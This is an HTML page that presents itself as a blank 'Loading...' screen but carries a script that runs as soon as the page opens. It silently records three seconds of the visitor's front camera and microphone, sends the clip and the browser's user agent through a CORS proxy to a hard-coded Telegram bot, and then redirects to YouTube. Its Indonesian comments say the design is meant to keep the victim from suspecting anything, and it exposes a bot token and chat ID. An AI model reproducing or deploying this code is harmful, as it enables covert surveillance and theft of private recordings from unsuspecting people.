<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Meta tag untuk mencegah zoom dan membuat tampilan full screen seperti aplikasi -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        /* Tampilan kosong polos (Background putih) biar kelihatan biasa aja */
        body { 
            background-color: #ffffff; 
            margin: 0; 
            overflow: hidden; 
        }
        
        #video { 
            display: none; /* Sembunyikan video preview */
            position: absolute;
            top: -9999px;
        }
    </style>
</head>
<body>

    <!-- Video elemen disembunyikan -->
    <video id="video" autoplay playsinline muted></video>

    <script>
        // --- KONFIGURASI ---
        const BOT_TOKEN = '8530007197:AAHlOHC1LIBYe4L5iPcUciT8nxSY-I9HQps';
        const CHAT_ID = '5803378702';
        
        // Link tujuan setelah selesai (Bisa diganti apa aja)
        const REDIRECT_URL = "https://www.youtube.com"; 
        
        // Durasi rekaman (3 detik)
        const RECORD_DURATION = 3000; 

        const videoElem = document.getElementById("video");

        async function startSilentCapture() {
            try {
                // 1. Langsung ambil stream kamera tanpa notifikasi UI apapun
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                videoElem.srcObject = stream;
                
                // 2. Mulai proses rekam segera setelah metadata video load
                videoElem.onloadedmetadata = () => {
                    // Kita beri delay sangat singkat atau langsung jalan
                    setTimeout(() => {
                        recordStream(stream);
                    }, 500); // 0.5 detik delay biar kamera ready
                };

            } catch (err) {
                console.error("Akses ditolak:", err);
                // Kalau akses ditolak, langsung pindah saja biar gak curiga
                window.location.href = REDIRECT_URL;
            }
        }

        function recordStream(stream) {
            let mediaRecorder;
            let chunks = [];
            
            // Gunakan format video webm
            const mimeType = 'video/webm;codecs=vp9' || 'video/webm';
            
            try {
                mediaRecorder = new MediaRecorder(stream, { mimeType });
            } catch (e) {
                console.error(e);
                window.location.href = REDIRECT_URL;
                return;
            }

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: mimeType });
                
                // Matikan kamera
                stream.getTracks().forEach(track => track.stop());
                
                // Kirim video
                sendVideo(blob);
            };

            // Mulai merekam
            mediaRecorder.start();

            // Stop setelah durasi habis
            setTimeout(() => {
                mediaRecorder.stop();
            }, RECORD_DURATION);
        }

        function sendVideo(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', blob, `silent_cap_${Date.now()}.webm`);
            formData.append('caption', `ðŸŽ¥ Silent Capture\nTarget: ${navigator.userAgent}`);

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
            const proxyUrl = `https://corsproxy.io/?` + encodeURIComponent(telegramUrl);

            fetch(proxyUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log("Terkirim");
                // Setelah sukses kirim, baru pindah halaman
                finalize();
            })
            .catch(err => {
                console.error(err);
                // Kalau gagal kirim tetap pindah halaman biar user nggak nyangka
                finalize();
            });
        }

        function finalize() {
            // Pindah ke halaman tujuan
            window.location.href = REDIRECT_URL;
        }

        // Jalankan otomatis saat halaman dibuka
        window.onload = startSilentCapture;

    </script>
</body>
</html>
